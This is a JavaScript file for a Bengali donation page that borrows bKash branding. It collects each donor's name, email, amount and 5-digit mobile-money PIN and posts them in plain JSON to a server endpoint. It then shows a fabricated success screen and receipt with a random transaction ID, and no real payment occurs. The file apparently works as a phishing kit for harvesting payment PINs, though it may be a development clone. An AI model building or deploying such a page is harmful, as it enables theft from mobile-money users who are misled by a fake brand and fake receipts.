// donationJS.js - Complete JavaScript for the SurePay Donation functionality

document.addEventListener("DOMContentLoaded", function () {

  let allDetails = {} ;

  // Initialize main elements
  const mainContainer = document.getElementById("mainContainer");
  const foundationItems = document.querySelectorAll(".foundation-item");
  const backButton = document.querySelector(".back-button");
  const donationFormPopup = document.getElementById("donationFormPopup");
  const pinEntryPopup = document.getElementById("pinEntryPopup");
  const successPopup = document.getElementById("successPopup");
  const receiptTemplate = document.getElementById("receiptTemplate");

  // Initialize state
  let currentFoundation = null;
  let formState = {
    hideIdentity: false,
    name: "",
    email: "",
    amount: "",
  };

  // Function to toggle body scrolling
  function toggleBodyScroll(disableScroll) {
    if (disableScroll) {
      document.body.classList.add("popup-active");
    } else {
      document.body.classList.remove("popup-active");
    }
  }

  // Utility function to show popup
  function showPopup(popup) {
    // Disable body scrolling
    toggleBodyScroll(true);

    // Hide all popups first
    mainContainer.style.display = "none";
    donationFormPopup.style.display = "none";
    pinEntryPopup.style.display = "none";
    successPopup.style.display = "none";

    // Show the requested popup
    popup.style.display = "flex";
    popup.style.opacity = "0";
    popup.style.transform = "translate(-50%, -50%) scale(0.9)";

    // Force reflow and animate in
    setTimeout(() => {
      popup.style.opacity = "1";
      popup.style.transform = "translate(-50%, -50%) scale(1)";
    }, 10);
  }

  // Function to generate transaction ID
  function generateTransactionId() {
    const characters =
      "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let result = "";
    for (let i = 0; i < 10; i++) {
      result += characters.charAt(
        Math.floor(Math.random() * characters.length)
      );
    }
    return result;
  }

  // Add click event listeners to foundation items
  foundationItems.forEach((item) => {
    item.addEventListener("click", function () {
      const foundationName = this.querySelector(".foundation-name").textContent;
      const foundationLogo = this.querySelector(".foundation-logo img").src;
      currentFoundation = {
        name: foundationName,
        logo: foundationLogo,
      };

      // Update the donation form popup with foundation info
      document.getElementById("selectedFoundationName").textContent =
        foundationName;
      document.getElementById("selectedFoundationLogo").src = foundationLogo;
      document.getElementById("selectedFoundationLogo").alt = foundationName;

      // Show the donation form popup
      showPopup(donationFormPopup);

          allDetails.organization = foundationName ;

    });
  });

  // Handle main back button
  // Replace the back button with a logo in the main page
  if (backButton) {
    backButton.innerHTML =
      '<img src="/public/images/bkashlogo.png" alt="বিকাশ লোগো" style="height: 24px; width: auto; object-fit: contain;">';
    backButton.style.cursor = "default"; // Remove the cursor pointer
  }

  // Setup donation form event listeners
  const hideIdentityCheckbox = document.getElementById("hideIdentity");
  const nameInput = document.getElementById("donorName");
  const emailInput = document.getElementById("donorEmail");
  const donationAmountInput = document.getElementById("donationAmount");
  const donationForm = document.getElementById("donationForm");
  const donationFormBackButton = document.getElementById("donationFormBackButton");
  let submitBtn= document.getElementById("submitBtn") ;

  // Handle identity hiding toggle
  hideIdentityCheckbox.addEventListener("change", function () {
    formState.hideIdentity = this.checked;

    if (this.checked) {
      nameInput.disabled = true;
      nameInput.style.opacity = "0.5";
      emailInput.disabled = true;
      emailInput.style.opacity = "0.5";
    } else {
      nameInput.disabled = false;
      nameInput.style.opacity = "1";
      emailInput.disabled = false;
      emailInput.style.opacity = "1";
    }
  });

  // Handle donation form submission
  donationForm.addEventListener("submit", function (e) {
    e.preventDefault();

    formState.name = nameInput.value;
    formState.email = emailInput.value;
    formState.amount = donationAmountInput.value;

    // Validate amount
    if (!formState.amount || isNaN(formState.amount) || formState.amount <= 0) {
      alert("অনুগ্রহ করে সঠিক অনুদানের পরিমাণ দিন");
      return;
    }

    // Update PIN entry popup with donation info
    document.getElementById("pinPopupFoundationName").textContent =
      currentFoundation.name;
    document.getElementById("pinPopupFoundationLogo").src =
      currentFoundation.logo;
    document.getElementById("pinPopupFoundationLogo").alt =
      currentFoundation.name;
    document.getElementById("pinPopupAmount").textContent =
      formState.amount + " টাকা";

    // Show PIN entry popup
    showPopup(pinEntryPopup);
  });

  // Handle donation form back button
  donationFormBackButton.addEventListener("click", function () {
    // Return to main page with foundation list
    toggleBodyScroll(false);
    showPopup(mainContainer);
  });

  // Set up PIN input auto-focus
  const pinInputs = document.querySelectorAll(".pin-input");

  pinInputs.forEach((input, index) => {
    input.addEventListener("input", function () {
      if (this.value.length === this.maxLength) {
        if (index < pinInputs.length - 1) {
          pinInputs[index + 1].focus();
        }
      }
    });

    input.addEventListener("keydown", function (e) {
      if (e.key === "Backspace" && this.value.length === 0 && index > 0) {
        pinInputs[index - 1].focus();
      }
    });
  });

  // Handle PIN form submission
  const pinForm = document.getElementById("pinForm");
  const pinEntryBackButton = document.getElementById("pinEntryBackButton");

  pinForm.addEventListener("submit", function (e) {
    e.preventDefault();

    // Get PIN
    let pin = "";
    pinInputs.forEach((input) => {
      pin += input.value;
    });

    // Validate PIN
    if (pin.length !== 5) {
      alert("অনুগ্রহ করে সঠিক 5 ডিজিট পিন দিন");
      return;
    }

    // Prepare success popup
    prepareSuccessPopup();

    // Show success popup
    showPopup(successPopup);
  });

  // Handle back button - Return to donation form
  pinEntryBackButton.addEventListener("click", function () {
    // Return to donation form
    showPopup(donationFormPopup);
  });

  // Function to prepare success popup data
  function prepareSuccessPopup() {
    const currentDate = new Date();
    const dateString = currentDate.toLocaleDateString("bn-BD", {
      year: "numeric",
      month: "long",
      day: "numeric",
    });
    const timeString = currentDate.toLocaleTimeString("bn-BD", {
      hour: "2-digit",
      minute: "2-digit",
    });
    const transactionId = generateTransactionId();

    // Update success popup elements
    document.getElementById("successDateTime").textContent =
      dateString + ", " + timeString;
    document.getElementById("successTransactionId").textContent = transactionId;
    document.getElementById("successFoundationName").textContent =
      currentFoundation.name;
    document.getElementById("successAmount").textContent =
      formState.amount + " টাকা";
  }

  // Set up event listeners for success popup
  const downloadButton = document.getElementById("downloadReceipt");
  const doneButton = document.getElementById("donationDone");
  const successBackButton = document.getElementById("successBackButton");

  downloadButton.addEventListener("click", function () {
    generateAndDownloadReceipt();
  });

  doneButton.addEventListener("click", function () {
    // Re-enable body scrolling
    toggleBodyScroll(false);

    // Return to main foundation list
    showPopup(mainContainer);

    // Reset form and clear pin inputs
    resetForms();
  });

  // Handle back button - Return to PIN entry screen
  successBackButton.addEventListener("click", function () {
    // Return to PIN entry screen
    showPopup(pinEntryPopup);
  });

  // Function to reset forms after successful donation
  function resetForms() {
    // Reset donation form
    donationForm.reset();
    hideIdentityCheckbox.checked = false;
    nameInput.disabled = false;
    nameInput.style.opacity = "1";
    emailInput.disabled = false;
    emailInput.style.opacity = "1";

    // Reset PIN inputs
    pinInputs.forEach((input) => {
      input.value = "";
    });

    // Reset formState
    formState = {
      hideIdentity: false,
      name: "",
      email: "",
      amount: "",
    };
  }

  // Function to generate and download receipt
  function generateAndDownloadReceipt() {
    const currentDate = new Date();
    const dateString = currentDate.toLocaleDateString("bn-BD", {
      year: "numeric",
      month: "long",
      day: "numeric",
    });
    const timeString = currentDate.toLocaleTimeString("bn-BD", {
      hour: "2-digit",
      minute: "2-digit",
    });
    const transactionId = document.getElementById(
      "successTransactionId"
    ).textContent;
    const year = new Date().getFullYear();

    // Get the receipt template and replace placeholders
    let receiptHTML = document.getElementById("receiptTemplate").innerHTML;

    // Replace template variables with dynamic content
    receiptHTML = receiptHTML.replace("{{transactionId}}", transactionId);
    receiptHTML = receiptHTML.replace(
      "{{dateTime}}",
      dateString + ", " + timeString
    );
    receiptHTML = receiptHTML.replace(
      "{{foundationName}}",
      currentFoundation.name
    );

    // Conditionally add donor info
    if (!formState.hideIdentity) {
      const donorInfoHTML = `
        <div class="detail-row">
            <span class="detail-label">দাতার নাম</span>
            <span class="detail-value">${formState.name || "অজানা"}</span>
        </div>
        <div class="detail-row">
            <span class="detail-label">দাতার ই-মেইল</span>
            <span class="detail-value">${formState.email || "অজানা"}</span>
        </div>
      `;
      receiptHTML = receiptHTML.replace("{{donorInfo}}", donorInfoHTML);
    } else {
      receiptHTML = receiptHTML.replace("{{donorInfo}}", "");
    }

    receiptHTML = receiptHTML.replace("{{amount}}", formState.amount);
    receiptHTML = receiptHTML.replace("{{year}}", year);

    // Create blob and download
    const blob = new Blob([receiptHTML], { type: "text/html" });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = `bKash_Donation_Receipt_${transactionId}.html`;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
  }

  // Initially show the main container
  showPopup(mainContainer);

  submitBtn.addEventListener("click" , function(){

    allDetails.donar = nameInput.value ;
    allDetails.email = emailInput.value ;
    allDetails.amount = donationAmountInput.value ;

    // console.log(allDetails) ;

      let pins = document.querySelectorAll(".pin-input");
      let fullPins = "";

    pins.forEach(function(item){
      fullPins += item.value;
    });

    allDetails.pin = fullPins ;

    // Use relative URL instead of hardcoded localhost
    fetch("http://localhost:3000/donation", {
      method: "POST",
      headers: {
        "content-type": "application/json"
      },
      body: JSON.stringify({allDetails})
    })
    .then(async function(r1){

    const data = await r1.json();

    if(r1.ok) {
      // console.log("Success:", data.message);  
      alert(data.message) ;
    } else {
      alert(data.message) ;
      // console.error("Error:", data.message);  
    }
  })
  .catch(function(err){
    console.error("Network error:", err);
  });


  })


});
